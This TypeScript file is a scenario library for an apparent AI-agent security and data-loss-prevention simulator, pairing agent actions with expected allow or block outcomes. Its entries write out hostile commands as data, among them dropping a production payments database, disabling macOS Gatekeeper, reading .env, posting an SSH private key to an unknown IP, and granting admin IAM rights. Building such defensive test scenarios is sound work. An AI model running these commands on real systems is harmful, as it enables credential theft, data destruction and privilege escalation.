// ============================================================================
// Scenario library — structured data, not screen-specific code (§50).
// Adding a scenario = adding an entry here. The simulator turns a scenario
// into SimulationEvent(s) through the same Core Brain the whole app uses.
// ============================================================================

import type { ActionVerb, DestinationClass, Environment } from "../model/types";

export interface ScenarioFinding {
  dataClass: string;
  count: number;
  sample: string; // masked sample shown in findings
}

export interface Scenario {
  id: string;
  group: "NETWORK" | "ENDPOINT" | "GATEWAY" | "CONTEXT" | "SAFETY" | "TASK";
  title: string;
  narrative: string; // what the human/agent is doing
  expected: string; // expected outcome label from the brief
  plane: "ENDPOINT" | "NETWORK" | "GATEWAY";
  action: ActionVerb;
  actionRaw?: string;
  agent: string;
  user: string;
  application?: string;
  resource: string; // resource id or path label
  environment: Environment;
  destination?: string; // destination id
  destinationClass?: DestinationClass;
  fileName?: string;
  payload?: string; // original payload / file content
  findings?: ScenarioFinding[];
  uninspectable?: { reason: string };
  blast?: { files?: number; rows?: number; recipients?: number; spendUsd?: number; label: string; severity: "low" | "moderate" | "high" | "critical"; dependencies?: string[] };
  sensitivity: "disposable" | "internal" | "sensitive" | "customer-impacting";
  privileged?: boolean;
}

export const SCENARIOS: Scenario[] = [
  // ── NETWORK ───────────────────────────────────────────────────────────────
  {
    id: "net-pii-approved",
    group: "NETWORK",
    title: "Customer PII → approved AI",
    narrative: "Priya attaches customers.csv to a prompt in the approved enterprise AI and clicks Send.",
    expected: "CONSTRAIN — emails & phones reversibly tokenized",
    plane: "NETWORK", action: "NETWORK_SEND", agent: "a-chatgpt", user: "u-priya",
    application: "Browser", resource: "customers.csv", environment: "local",
    destination: "dest-approved-ai", destinationClass: "APPROVED_AI",
    fileName: "customers.csv",
    payload: "name,email,phone\nAlice Johnson,alice@example.com,+1 415 555 0100\nRahul Iyer,rahul.iyer@example.net,+1 628 555 0193\nSofia García,sofia.garcia@example.org,+1 917 555 0142",
    findings: [
      { dataClass: "PII.NAME", count: 3, sample: "Alice Johnson" },
      { dataClass: "PII.EMAIL", count: 3, sample: "a•••e@example.com" },
      { dataClass: "PII.PHONE", count: 3, sample: "+1 415 ••• ••00" },
    ],
    sensitivity: "sensitive",
  },
  {
    id: "net-cred-approved",
    group: "NETWORK",
    title: "Credential → approved AI",
    narrative: "Daniel pastes config.yaml — which contains a live API key — into an AI chat and attaches it.",
    expected: "BLOCK — blocked before transmission",
    plane: "NETWORK", action: "NETWORK_SEND", agent: "a-claude", user: "u-daniel",
    application: "Browser", resource: "config.yaml", environment: "local",
    destination: "dest-claude", destinationClass: "APPROVED_AI",
    fileName: "config.yaml",
    payload: "service: payments\nregion: us-east-1\napi_key: sk_live_51Hxxxxxxxxxxxxxxxxxxxxxx\ntimeout: 30",
    findings: [{ dataClass: "CREDENTIAL.API_KEY", count: 1, sample: "sk_live_••••••••" }],
    sensitivity: "sensitive",
  },
  {
    id: "net-code-approved",
    group: "NETWORK",
    title: "Source code → approved AI",
    narrative: "Daniel uploads checkout.ts to the approved AI to ask for a refactor.",
    expected: "ALLOW",
    plane: "NETWORK", action: "NETWORK_SEND", agent: "a-claude", user: "u-daniel",
    application: "Browser", resource: "checkout.ts", environment: "local",
    destination: "dest-claude", destinationClass: "APPROVED_AI",
    fileName: "checkout.ts",
    payload: "export async function submitOrder(cart: Cart) {\n  const total = cart.items.reduce((s, i) => s + i.price, 0);\n  return api.post('/orders', { items: cart.items, total });\n}",
    findings: [{ dataClass: "SOURCE_CODE", count: 1, sample: "checkout.ts (TypeScript)" }],
    sensitivity: "internal",
  },
  {
    id: "net-code-unapproved",
    group: "NETWORK",
    title: "Source code → unapproved external",
    narrative: "Daniel pastes proprietary checkout code into FreeAIChat, a known but unapproved AI tool.",
    expected: "REVIEW",
    plane: "NETWORK", action: "NETWORK_SEND", agent: "a-chatgpt", user: "u-daniel",
    application: "Browser", resource: "checkout.ts", environment: "local",
    destination: "dest-unapproved-ai", destinationClass: "UNAPPROVED_AI",
    fileName: "checkout.ts",
    payload: "export async function submitOrder(cart: Cart) { /* proprietary pricing logic */ }",
    findings: [{ dataClass: "SOURCE_CODE", count: 1, sample: "checkout.ts (TypeScript)" }],
    sensitivity: "internal",
  },
  {
    id: "net-encrypted",
    group: "NETWORK",
    title: "Protected encrypted file → external",
    narrative: "Alex uploads records-q3.zip — an AES-encrypted archive that policy says should contain customer records.",
    expected: "UNINSPECTABLE → BLOCK (fail closed)",
    plane: "NETWORK", action: "NETWORK_SEND", agent: "a-copilot", user: "u-alex",
    application: "Browser", resource: "records-q3.zip", environment: "local",
    destination: "dest-approved-ai", destinationClass: "APPROVED_AI",
    fileName: "records-q3.zip",
    payload: "PK\u0003\u0004 … AES-256 encrypted archive (2.4 MB) — contents not readable …",
    uninspectable: { reason: "AES-encrypted archive — cannot inspect contents" },
    sensitivity: "sensitive",
  },
  {
    id: "net-unknown-dest",
    group: "NETWORK",
    title: "Customer data → unknown external endpoint",
    narrative: "A process on Finance-Laptop-07 posts export.json with customer identifiers to an unclassified IP address.",
    expected: "BLOCK — fail-safe on unknown destination",
    plane: "NETWORK", action: "NETWORK_SEND", agent: "a-unknown-mcp", user: "u-alex",
    application: "Unknown process", resource: "export.json", environment: "local",
    destination: "dest-unknown", destinationClass: "UNKNOWN_EXTERNAL",
    fileName: "export.json",
    payload: '{"customers":[{"id":"VRD-CUST-0921","account":"ACCT-99128842"},{"id":"VRD-CUST-1147","account":"ACCT-99310027"}]}',
    findings: [
      { dataClass: "CUSTOM.CUSTOMER_ID", count: 2, sample: "VRD-CUST-0921" },
      { dataClass: "FINANCIAL.ACCOUNT", count: 2, sample: "ACCT-••••8842" },
    ],
    sensitivity: "customer-impacting",
  },
  // ── ENDPOINT ─────────────────────────────────────────────────────────────
  {
    id: "ep-read-src",
    group: "ENDPOINT",
    title: "Agent reads source code",
    narrative: "Daniel asks Claude Code to fix checkout. The agent reads src/app.ts.",
    expected: "ALLOW",
    plane: "ENDPOINT", action: "READ", actionRaw: "read src/app.ts",
    agent: "a-claude-code", user: "u-daniel", application: "Terminal",
    resource: "src/app.ts", environment: "development",
    findings: [{ dataClass: "SOURCE_CODE", count: 1, sample: "src/app.ts (TypeScript)" }],
    sensitivity: "internal",
  },
  {
    id: "ep-read-env",
    group: "ENDPOINT",
    title: "Agent reads .env",
    narrative: "Claude Code attempts to read .env while investigating a config issue.",
    expected: "BLOCK — agents may not read secrets files",
    plane: "ENDPOINT", action: "SECRET_ACCESS", actionRaw: "cat .env",
    agent: "a-claude-code", user: "u-daniel", application: "Terminal",
    resource: ".env", environment: "local",
    findings: [
      { dataClass: "CREDENTIAL.API_KEY", count: 2, sample: "STRIPE_KEY=sk_live_••••" },
      { dataClass: "CREDENTIAL.PASSWORD", count: 1, sample: "DB_PASSWORD=••••" },
    ],
    sensitivity: "sensitive",
  },
  {
    id: "ep-run-tests",
    group: "ENDPOINT",
    title: "Agent runs tests",
    narrative: "Claude Code executes `npm test` in the checkout-service working tree.",
    expected: "ALLOW",
    plane: "ENDPOINT", action: "EXECUTE", actionRaw: "npm test",
    agent: "a-claude-code", user: "u-daniel", application: "Terminal",
    resource: "checkout-service", environment: "development",
    sensitivity: "internal",
  },
  {
    id: "ep-del-tmp",
    group: "ENDPOINT",
    title: "Agent deletes temp test files",
    narrative: "Claude Code removes three temporary fixture files it created during testing.",
    expected: "ALLOW",
    plane: "ENDPOINT", action: "DELETE", actionRaw: "rm tmp/fixture-{1,2,3}.json",
    agent: "a-claude-code", user: "u-daniel", application: "Terminal",
    resource: "tmp/fixture-*.json", environment: "development",
    blast: { files: 3, label: "3 disposable files", severity: "low" },
    sensitivity: "disposable",
  },
  {
    id: "ep-del-proddb",
    group: "ENDPOINT",
    title: "Agent drops production-like database",
    narrative: "A local script run by Claude Code attempts to drop the payments database over a production tunnel.",
    expected: "BLOCK",
    plane: "ENDPOINT", action: "DELETE", actionRaw: "psql -h payments-prod -c 'DROP DATABASE payments'",
    agent: "a-claude-code", user: "u-daniel", application: "Terminal",
    resource: "payments-prod", environment: "production",
    blast: { rows: 8_421_392, label: "8.4M customer rows · 3 dependent services", severity: "critical", dependencies: ["checkout-service", "billing-service", "support-portal"] },
    sensitivity: "customer-impacting",
  },
  {
    id: "ep-security-change",
    group: "ENDPOINT",
    title: "Agent disables a security control",
    narrative: "A subprocess attempts `spctl --master-disable` to turn off Gatekeeper.",
    expected: "BLOCK",
    plane: "ENDPOINT", action: "SECURITY_CHANGE", actionRaw: "spctl --master-disable",
    agent: "a-codex", user: "u-daniel", application: "Terminal",
    resource: "macOS Gatekeeper", environment: "local",
    sensitivity: "sensitive",
  },
  // ── GATEWAY ───────────────────────────────────────────────────────────────
  {
    id: "gw-push-feature",
    group: "GATEWAY",
    title: "Push feature branch",
    narrative: "Claude Code pushes fix/checkout-rounding to GitHub.",
    expected: "ALLOW",
    plane: "GATEWAY", action: "WRITE", actionRaw: "git push origin fix/checkout-rounding",
    agent: "a-claude-code", user: "u-daniel", application: "GitHub MCP",
    resource: "r-checkout", environment: "development",
    findings: [{ dataClass: "SOURCE_CODE", count: 4, sample: "4 changed files" }],
    blast: { files: 4, label: "4 files · feature branch", severity: "low" },
    sensitivity: "internal",
  },
  {
    id: "gw-force-main",
    group: "GATEWAY",
    title: "Force push main",
    narrative: "Claude Code attempts `git push --force origin main` — 14 commits would be rewritten.",
    expected: "REVIEW",
    plane: "GATEWAY", action: "WRITE", actionRaw: "git push --force origin main",
    agent: "a-claude-code", user: "u-daniel", application: "GitHub MCP",
    resource: "r-checkout", environment: "production",
    findings: [{ dataClass: "SOURCE_CODE", count: 14, sample: "14 commits rewritten" }],
    blast: { files: 31, label: "history rewrite · 14 commits · protected branch", severity: "high" },
    sensitivity: "sensitive",
  },
  {
    id: "gw-select-50",
    group: "GATEWAY",
    title: "SQL SELECT 50 rows",
    narrative: "Support Agent queries 50 recent tickets from customer-db.",
    expected: "ALLOW",
    plane: "GATEWAY", action: "READ", actionRaw: "SELECT * FROM tickets ORDER BY created_at DESC LIMIT 50",
    agent: "a-support", user: "u-maya", application: "SQL MCP",
    resource: "r-customer-db", environment: "production",
    blast: { rows: 50, label: "50 rows", severity: "low" },
    sensitivity: "customer-impacting",
  },
  {
    id: "gw-export-500k",
    group: "GATEWAY",
    title: "Export 500,000 customer rows",
    narrative: "Internal Finance Agent attempts a bulk export of the full customer table to a file share.",
    expected: "BLOCK — mass export",
    plane: "GATEWAY", action: "DATA_EXPORT", actionRaw: "COPY (SELECT * FROM customers) TO 'export.csv'",
    agent: "a-finance", user: "u-alex", application: "SQL MCP",
    resource: "r-customer-db", environment: "production",
    destination: "dest-generic", destinationClass: "GENERIC_EXTERNAL",
    findings: [
      { dataClass: "CUSTOM.CUSTOMER_ID", count: 500000, sample: "VRD-CUST-••••" },
      { dataClass: "PII.EMAIL", count: 500000, sample: "•••@•••" },
    ],
    blast: { rows: 500_000, label: "500,000 customer rows", severity: "critical" },
    sensitivity: "customer-impacting",
  },
  {
    id: "gw-drop-table",
    group: "GATEWAY",
    title: "DROP TABLE customers (production)",
    narrative: "An agent issues DROP TABLE customers against payments-prod.",
    expected: "BLOCK",
    plane: "GATEWAY", action: "DELETE", actionRaw: "DROP TABLE customers",
    agent: "a-finance", user: "u-alex", application: "SQL MCP",
    resource: "r-payments-prod", environment: "production",
    blast: { rows: 8_421_392, label: "8,421,392 rows · 3 dependent services", severity: "critical", dependencies: ["checkout-service", "billing-service", "support-portal"] },
    sensitivity: "customer-impacting",
  },
  {
    id: "gw-iam-admin",
    group: "GATEWAY",
    title: "Dangerous cloud IAM change",
    narrative: "An agent attaches AdministratorAccess to the ci-runner role in AWS Production.",
    expected: "BLOCK / REVIEW",
    plane: "GATEWAY", action: "PERMISSION_CHANGE", actionRaw: "iam:AttachRolePolicy AdministratorAccess → role/ci-runner",
    agent: "a-claude-code", user: "u-daniel", application: "AWS API",
    resource: "r-aws-prod", environment: "production",
    blast: { label: "Full administrative authority to automation role", severity: "critical" },
    sensitivity: "customer-impacting", privileged: true,
  },
  // ── CONTEXT ───────────────────────────────────────────────────────────────
  {
    id: "ctx-del-testdb",
    group: "CONTEXT",
    title: "DELETE test database",
    narrative: "Claude Code drops scratch-test-db: local, disposable, 12 fixture rows.",
    expected: "ALLOW — context makes it safe",
    plane: "GATEWAY", action: "DELETE", actionRaw: "DROP DATABASE scratch_test",
    agent: "a-claude-code", user: "u-daniel", application: "SQL MCP",
    resource: "r-test-db", environment: "test",
    blast: { rows: 12, label: "12 disposable fixture rows", severity: "low" },
    sensitivity: "disposable",
  },
  {
    id: "ctx-del-proddb",
    group: "CONTEXT",
    title: "DELETE production payment database",
    narrative: "The very same verb — DELETE — against payments-prod: production, customer-impacting, 8.4M records.",
    expected: "BLOCK — context changed the decision",
    plane: "GATEWAY", action: "DELETE", actionRaw: "DROP DATABASE payments",
    agent: "a-claude-code", user: "u-daniel", application: "SQL MCP",
    resource: "r-payments-prod", environment: "production",
    blast: { rows: 8_421_392, label: "8.4M customer records", severity: "critical", dependencies: ["checkout-service", "billing-service", "support-portal"] },
    sensitivity: "customer-impacting",
  },
  // ── SAFETY KERNEL ─────────────────────────────────────────────────────────
  {
    id: "sk-privkey-exfil",
    group: "SAFETY",
    title: "Private key exfiltration to an unknown site",
    narrative: "An unknown program tries to POST ~/.ssh/id_rsa to an unknown website. The Safety Kernel blocks this even when no company rule exists; with rules on, it acts as a second lock.",
    expected: "BLOCK — company credential rule, Safety Kernel as second lock",
    plane: "NETWORK", action: "NETWORK_SEND", actionRaw: "POST https://185.220.101.42/upload",
    agent: "a-unknown-mcp", user: "u-alex", application: "Unknown process",
    resource: "~/.ssh/id_rsa", environment: "local",
    destination: "dest-unknown", destinationClass: "UNKNOWN_EXTERNAL",
    fileName: "id_rsa",
    payload: "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7…(2048-bit key material)…\n-----END RSA PRIVATE KEY-----",
    findings: [{ dataClass: "CREDENTIAL.PRIVATE_KEY", count: 1, sample: "-----BEGIN RSA PRIVATE KEY-----" }],
    sensitivity: "sensitive",
  },
];

// The 10-step TASK scenario is defined separately — it drives park/resume.
export interface TaskScenarioStep {
  label: string;
  action: ActionVerb;
  actionRaw: string;
  resource: string;
  environment: Environment;
  dependsOn: number[];
  sensitivity: "disposable" | "internal" | "sensitive" | "customer-impacting";
  // Optional detail for steps that move data or money.
  plane?: Scenario["plane"];
  application?: string;
  destination?: string;
  destinationClass?: DestinationClass;
  fileName?: string;
  payload?: string;
  findings?: ScenarioFinding[];
  blast?: Scenario["blast"];
}

/** The permission slip a team's jobs start with (Task Envelope template). */
export interface EnvelopeTemplate {
  name: string;
  allowedResources: string[];
  allowedActions: ActionVerb[];
  environment: Environment;
  forbidden: string[];
  durationMin: number;
  fileBudget: number;
}

/** A real job a person hands to an AI agent. Its risky step goes to an
 *  approver who is never the person who asked (requester separation). */
export interface TaskJob {
  id: string;
  team: "Engineering" | "Finance" | "Support" | "Operations";
  title: string;
  agent: string;
  user: string; // who asked
  approver: string; // who decides risky steps
  approverRole: string;
  envelope: EnvelopeTemplate;
  steps: TaskScenarioStep[];
}

export const TASK_JOBS: TaskJob[] = [
  {
    id: "job-eng-checkout",
    team: "Engineering",
    title: "Fix checkout and deploy",
    agent: "a-claude-code",
    user: "u-daniel",
    approver: "u-alex",
    approverRole: "Engineering Manager",
    envelope: {
      name: "Engineering · code change",
      allowedResources: ["src/", "tests/", "tmp/", "CHANGELOG.md", "docs/", "checkout-service", "r-checkout"],
      allowedActions: ["READ", "WRITE", "EXECUTE", "DELETE"],
      environment: "development",
      forbidden: ["production", ".env", "credentials"],
      durationMin: 30,
      fileBudget: 25,
    },
    steps: [
      { label: "Read checkout source", action: "READ", actionRaw: "read src/checkout.ts", resource: "src/checkout.ts", environment: "development", dependsOn: [], sensitivity: "internal" },
      { label: "Read failing test", action: "READ", actionRaw: "read tests/checkout.test.ts", resource: "tests/checkout.test.ts", environment: "development", dependsOn: [], sensitivity: "internal" },
      { label: "Patch rounding bug", action: "WRITE", actionRaw: "edit src/checkout.ts", resource: "src/checkout.ts", environment: "development", dependsOn: [0, 1], sensitivity: "internal" },
      { label: "Run unit tests", action: "EXECUTE", actionRaw: "npm test", resource: "checkout-service", environment: "development", dependsOn: [2], sensitivity: "internal" },
      { label: "Commit fix", action: "WRITE", actionRaw: "git commit -m 'fix: rounding'", resource: "r-checkout", environment: "development", dependsOn: [3], sensitivity: "internal" },
      { label: "Deploy to production", action: "DEPLOY", actionRaw: "deploy checkout-service → prod", resource: "r-aws-prod", environment: "production", dependsOn: [4], sensitivity: "customer-impacting", plane: "GATEWAY" },
      { label: "Update CHANGELOG", action: "WRITE", actionRaw: "edit CHANGELOG.md", resource: "CHANGELOG.md", environment: "development", dependsOn: [4], sensitivity: "internal" },
      { label: "Write release notes", action: "WRITE", actionRaw: "edit docs/release-notes.md", resource: "docs/release-notes.md", environment: "development", dependsOn: [4], sensitivity: "internal" },
      { label: "Clean temp fixtures", action: "DELETE", actionRaw: "rm tmp/fixture-*.json", resource: "tmp/fixture-*.json", environment: "development", dependsOn: [3], sensitivity: "disposable" },
      { label: "Verify production health", action: "READ", actionRaw: "curl /healthz (prod)", resource: "r-aws-prod", environment: "production", dependsOn: [5], sensitivity: "internal", plane: "GATEWAY" },
    ],
  },
  {
    id: "job-fin-q3",
    team: "Finance",
    title: "Prepare the Q3 revenue report",
    agent: "a-finance",
    user: "u-sam",
    approver: "u-maya",
    approverRole: "Security Analyst",
    envelope: {
      name: "Finance · reporting",
      allowedResources: ["r-customer-db", "Q3-revenue", "reports/"],
      allowedActions: ["READ", "EXECUTE", "WRITE", "NETWORK_SEND"],
      environment: "production",
      forbidden: [".env", "credentials", "r-payments-prod"],
      durationMin: 60,
      fileBudget: 10,
    },
    steps: [
      { label: "Query Q3 revenue totals", action: "READ", actionRaw: "SELECT month, SUM(amount) FROM orders WHERE quarter='Q3' GROUP BY month", resource: "r-customer-db", environment: "production", dependsOn: [], sensitivity: "customer-impacting", plane: "GATEWAY", application: "SQL MCP", blast: { rows: 3, label: "3 summary rows", severity: "low" } },
      { label: "Query top 50 accounts", action: "READ", actionRaw: "SELECT account, revenue FROM accounts ORDER BY revenue DESC LIMIT 50", resource: "r-customer-db", environment: "production", dependsOn: [], sensitivity: "customer-impacting", plane: "GATEWAY", application: "SQL MCP", blast: { rows: 50, label: "50 rows", severity: "low" } },
      { label: "Build revenue charts", action: "EXECUTE", actionRaw: "python build_charts.py", resource: "Q3-revenue", environment: "production", dependsOn: [0, 1], sensitivity: "internal" },
      { label: "Export every customer to a spreadsheet", action: "DATA_EXPORT", actionRaw: "COPY (SELECT * FROM customers) TO 'Q3-customers.csv'", resource: "r-customer-db", environment: "production", dependsOn: [0], sensitivity: "customer-impacting", plane: "GATEWAY", application: "SQL MCP", destination: "dest-internal", destinationClass: "INTERNAL", findings: [{ dataClass: "CUSTOM.CUSTOMER_ID", count: 50000, sample: "VRD-CUST-••••" }, { dataClass: "PII.EMAIL", count: 50000, sample: "•••@•••" }], blast: { rows: 50_000, label: "50,000 customer rows", severity: "high" } },
      { label: "Write the report summary", action: "WRITE", actionRaw: "write reports/Q3-summary.md", resource: "reports/Q3-summary.md", environment: "production", dependsOn: [2], sensitivity: "internal" },
      { label: "Attach customer sheet and send to the CFO", action: "NETWORK_SEND", actionRaw: "send report to cfo@veridian.example", resource: "reports/Q3-summary.md", environment: "production", dependsOn: [3, 4], sensitivity: "sensitive", destination: "dest-internal", destinationClass: "INTERNAL", plane: "NETWORK", application: "Mail" },
    ],
  },
  {
    id: "job-sup-refund",
    team: "Support",
    title: "Resolve refund ticket #4821",
    agent: "a-support",
    user: "u-jordan",
    approver: "u-sam",
    approverRole: "Finance Controller",
    envelope: {
      name: "Support · ticket resolution",
      allowedResources: ["r-support-saas", "r-customer-db", "ticket-4821"],
      allowedActions: ["READ", "WRITE", "NETWORK_SEND"],
      environment: "production",
      forbidden: [".env", "credentials", "r-payments-prod"],
      durationMin: 30,
      fileBudget: 5,
    },
    steps: [
      { label: "Read ticket #4821", action: "READ", actionRaw: "GET /tickets/4821", resource: "r-support-saas", environment: "production", dependsOn: [], sensitivity: "sensitive", plane: "GATEWAY", application: "Support SaaS API" },
      { label: "Look up the customer's orders", action: "READ", actionRaw: "SELECT * FROM orders WHERE customer='VRD-CUST-0921' LIMIT 20", resource: "r-customer-db", environment: "production", dependsOn: [0], sensitivity: "customer-impacting", plane: "GATEWAY", application: "SQL MCP", blast: { rows: 20, label: "20 rows", severity: "low" } },
      { label: "Draft a reply with the AI", action: "NETWORK_SEND", actionRaw: "POST draft request to ChatGPT", resource: "ticket-4821", environment: "production", dependsOn: [1], sensitivity: "sensitive", plane: "NETWORK", application: "Browser", destination: "dest-chatgpt", destinationClass: "APPROVED_AI", fileName: "ticket-4821.txt", payload: "Customer Alice Johnson (alice@example.com, +1 415 555 0100) was charged twice for order 88142. Draft an apology and confirm a refund.", findings: [{ dataClass: "PII.NAME", count: 1, sample: "Alice Johnson" }, { dataClass: "PII.EMAIL", count: 1, sample: "a•••e@example.com" }, { dataClass: "PII.PHONE", count: 1, sample: "+1 415 ••• ••00" }] },
      { label: "Refund $1,240 to the customer", action: "WRITE", actionRaw: "refund $1,240 on order 88142", resource: "r-stripe", environment: "production", dependsOn: [1], sensitivity: "customer-impacting", plane: "GATEWAY", application: "Stripe API", blast: { spendUsd: 1240, label: "$1,240 refund", severity: "high" } },
      { label: "Send the reply to the customer", action: "NETWORK_SEND", actionRaw: "send reply on ticket #4821", resource: "r-support-saas", environment: "production", dependsOn: [2, 3], sensitivity: "sensitive", plane: "NETWORK", application: "Support SaaS API", destination: "dest-salesforce", destinationClass: "APPROVED_SAAS" },
      { label: "Close the ticket", action: "WRITE", actionRaw: "PATCH /tickets/4821 status=solved", resource: "r-support-saas", environment: "production", dependsOn: [4], sensitivity: "sensitive", plane: "GATEWAY", application: "Support SaaS API" },
    ],
  },
  {
    id: "job-ops-staging",
    team: "Operations",
    title: "Fix the checkout outage",
    agent: "a-codex",
    user: "u-daniel",
    approver: "u-alex",
    approverRole: "Engineering Manager",
    envelope: {
      name: "Operations · incident fix",
      allowedResources: ["r-aws-staging", "logs/"],
      allowedActions: ["READ", "EXECUTE"],
      environment: "staging",
      forbidden: ["production", "credentials"],
      durationMin: 45,
      fileBudget: 5,
    },
    steps: [
      { label: "Read error logs", action: "READ", actionRaw: "aws logs tail /checkout --since 1h", resource: "logs/checkout", environment: "staging", dependsOn: [], sensitivity: "internal", plane: "GATEWAY", application: "AWS API" },
      { label: "Restart the staging service", action: "EXECUTE", actionRaw: "aws ecs update-service --cluster staging --force-new-deployment", resource: "r-aws-staging", environment: "staging", dependsOn: [0], sensitivity: "internal", plane: "GATEWAY", application: "AWS API" },
      { label: "Restart the production service", action: "EXECUTE", actionRaw: "aws ecs update-service --cluster prod --force-new-deployment", resource: "r-aws-prod", environment: "production", dependsOn: [1], sensitivity: "customer-impacting", plane: "GATEWAY", application: "AWS API" },
      { label: "Give the CI robot admin rights", action: "PERMISSION_CHANGE", actionRaw: "iam:AttachRolePolicy AdministratorAccess → role/ci-runner", resource: "r-aws-prod", environment: "production", dependsOn: [0], sensitivity: "customer-impacting", plane: "GATEWAY", application: "AWS API", blast: { label: "Full admin rights to an automation role", severity: "critical" } },
      { label: "Check production is healthy", action: "READ", actionRaw: "curl /healthz (prod)", resource: "r-aws-prod", environment: "production", dependsOn: [2], sensitivity: "internal", plane: "GATEWAY", application: "AWS API" },
    ],
  },
];

export function jobById(id: string | undefined): TaskJob {
  return TASK_JOBS.find((j) => j.id === id) ?? TASK_JOBS[0];
}

/** @deprecated kept for older callers — the Engineering job. */
export const TASK_SCENARIO = TASK_JOBS[0];

export function scenarioById(id: string): Scenario | undefined {
  return SCENARIOS.find((s) => s.id === id);
}
